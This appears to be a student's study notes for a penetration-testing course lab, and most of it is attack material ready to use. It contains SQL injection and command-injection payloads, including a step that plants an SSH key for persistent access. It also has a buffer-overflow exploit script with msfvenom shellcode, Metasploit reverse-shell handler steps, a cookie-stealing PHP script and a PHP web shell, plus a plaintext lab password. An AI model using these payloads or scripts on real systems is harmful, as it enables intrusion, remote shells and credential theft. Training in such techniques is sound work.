AT HOME -> USE MOBAXTERM!!!
------------------------------------------------------------------------------------------------------------------------
COSC SECURITY PRETEST NOTES
----------------------------------------------------------------------------------------------------
SECURITY DAY 1 MODULE LINKS AND INFO:
CTFD SERVER: http://10.50.20.250:8000/login
SECURITY FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-1-pentest_sg.html
USERNAME: DATA-505-M
PASSWORD: gZpnaU9ejwtC4QR
GREY HOST IP -> 10.50.42.146
QUOTES TO SCRAPE: https://quotes.toscrape.com/
ARMY CYBBH: https://vta.cybbh.space/horizon/project/
WIN OPS: 10.50.28.16
LIN OPS: 10.50.41.179
DRAW.IO: https://app.diagrams.net/
GOOGLE ROBOTS.TXT: https://www.google.com/robots.txt
----------------------------------------------------------------------------------------------------
MASTER SOCKET CREATION:
ssh -MS /tmp/gray student@10.50.26.14
ssh -MS /tmp/comrade comrade@localhost -p 41701
NEW DYNAMIC TUNNEL METHOD:
ssh -S /tmp/gray gray -O forward -D 9050
ssh -S /tmp/gray gray -O cancel -D 9050
ssh -S /tmp/comrade comrade -O forward -D 9050

NEW FORWARD TUNNEL METHOD:
ssh -S /tmp/gray gray -O forward -L 41700:192.168.28.111:80
ssh -S /tmp/gray gray -O forward -L 41701:192.168.28.111:22
ssh -S /tmp/gray gray -O cancel -L 41701:192.168.28.111:22
----------
xfreerdp /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution + clipboard /v:<IP>
RECON
  PING SWEEP: 
    Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
    Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
  PORT ENUMERATION:
    nmap -v -sT -Pn -T4 -sV <IP>
    nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
    nc -Cv 127.0.0.1 80
    nmap --script -v -sT -T4 -sV http-enum <IP Address> -p 80
       --script-args http-enum.basepath='<Web Server Dir/>' <IP Address>
    nmap -p 445 --script smb-os-discovery <IP Address / Subnet>
    nmap -p 80 --script=firewalk.nse <IP Address>
----------
WEB EXPLOITATION / SQL
  SQL EXAMPLE: select column, column, 8 (placeholder) FROM database.table
  EXAMPLE: ?Selection=2%20UNION%20select%20studentID,%20username,%20passwd%20FROM%20session.userinfo
  THE FOLLOWING MUST BE PUT INSIDE A VULNERABLE INPUT FIELD ON A WEBSITE AND NOT JUST IN THE URL:
  Audi 'UNION SELECT 1,2,3,4,5'; , 
  Audi 'UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns#
  Audi 'UNION SELECT tireid, 2, name, size,cost from session.Tires#
  
  THE ABOVE THREE LINES DISPLAY PADDING, IF YOU SEE A VALUE FIELD NOT PRINTING, PAD IT WITH A VALUE SO THE PAGE CAN STILL RENDER! NUMBER OF PADDED VALUES REQURIED DETERMINED BY DATABASE NUMBER OF FIELDS!!!
  FUZZING:
    ?product=1 OR 1=1; ITERATE THROUGH AND ATTEMPT EVERYWHERE POSSIBLE UNTIL ABNORMAL RESULT DISCOVERED; MOVE FORWARD FROM HERE!!!
  ON VULNERABLE PAGE ATTEMPT:
    ?product=7 UNION select 1,3,2
    ?product=7 UNION select table_schema,column_name,table_name FROM information_schema.columns;
      table_schema = DATABASE NAMES, table_name = TABLE NAMES, column_name = COLUMN NAMES 
    ?product=7 UNION select username, name, user_id FROM siteusers.users;
    ?selection=2 or 1=1;
    
  UPON DISCOVERY OF CREDENTIALS ATTEMPT BASE64, HEX, ROT-13 CONVERSIONS VIA CYBERCHEF IF NEEDED!!!
----------
CMD INJECTION:
ONCE CMD INJECTION POSSIBILITY VERIFIED IN VULNERABLE FORM (USE ; <CMD> FORMAT):
ON LIN-OPS EQUIVALENT: ssh-keygen -t rsa -b 4096
UPLOAD RESULTING id_rsa.pub FILE:
  cat id_rsa.pub, COPY CONTENTS TO CLIPBOARD
ON VULNERABLE FIELD ON PAGE AGAIN:
; mkdir /var/www/.ssh 
VERIFY CMD WITH ls -la
; ls -la /var/www/.ssh
; echo "CONTENTS OF YOUR id_rsa.pub FILE" > /var/www/.ssh/authorized_keys
VERIFY CMD WITH ls -la
----------
METHODOLOGY: 
WHEN DISCOVER IP OF INTEREST:
  SCAN PORTS: nmap -v -sT -Pn -T4 -sV <IP>
  SCAN HTTP: 
WHEN DISCOVER INPUT FIELD ON WEBSITE:
  - ATTEMPT DIRECTORY TRAVERSAL ../../../../ , LOOK AT /etc/passwd FOR USERS WITH SHELLS OR PERMS, /etc/host FOR NEW IPS
  - TO DISPLAY WHAT WAS SENT IN INPUT FIELD AFTER SUBMISSION: F12 -> NEWTWORK, REQUEST, ENABLE RAW, AFTER THIS: ADD "?" TO URL AFTER .php, THEN PASTE FINDINGS FROM THE REQUEST
  - OR TRY IN URL: ?username=tom' OR 1='1 & passwd=tom' OR 1='1
!!!ON WINDOWS INITIAL LOGIN, LOOK AT SERVICES, SCHEDULED TASKS, REGISTRY LOCATIONS RELEVANT TO PERSISTENCE!!!
GATOR BOYS EXAMPLE FOR BUFFER OVERFLOW:
  ./func <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"), ./func $(echo AAAAAAAAAAAAAAAAAAAAAAAAAA) 
  CHECK IF GDB INSTALLED TO DETERMINE IF GDB USAGE EVEN REQUIRED!!!
  gdb
  pdisas main
  pdisas getuserinput
  wiremask -> BUFFER OVERFLOW PATTERN GENERATOR!!! THEN USER GATOR BOYS!!!
  env - gdb ./func
  msfvenom -p linux/x86/exec CMD=<ONE CMD TO EXECUTE, PUT IN SINGLE QUOTES WITH && IN MIDDLE TO EXECUTE MULTIPLE'
  msfvenom -p linux/x96/meterpreter/reverse_tcp LHOST="ME" LPORT=4444 -b '\x00' -f python 
------------------------------------------------------------------------------------------------------------------------
SCRIPTS 
mybuff.py

  #!/usr/bin/python2.7

# Fill UP THE BUFFER
buf = "A" * 62

# EIP REGISTER TO JMP ESP
buf += "\x59\x3b\xde\xf7"

'''
JMP ESP addresses
0xf7de3b59  
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
'''
# assisti with encoding NOP SLED
buf +="\x90" * 10
'''
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
'''
# Shell Code / Payload below
buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"

print(buf)
---------------
!!!BANNER GRAB RELEVANT PORT FIRST!!!
MULTIHANDLER STEPS:
msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
show options
run
THEN USE SCRIPT BELOW!
---
secureServerBuffo.py
#!/usr/bin/python2.7

import socket

'''
625011AF
625011BB
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
'''


buf = "TRUN /.:/" #Exploit
buf += "A" * 2003 #Buffer Offset
buf += "\xa0\x12\x50\x62"  #JMP ESP
buf += "\x90" * 15 #NOP SLED
buf += #SHELLCODE HERE
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket

s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
print s.recv(1024)   #print response
s.send(buf)       #sends the variable buf
print s.recv(1024)   #print response
s.close()         #close the connection
---------------
cookie_stealer.php
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>
---------------
webshell.php
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>

------------------------------------------------------------------------------------------------------------------------
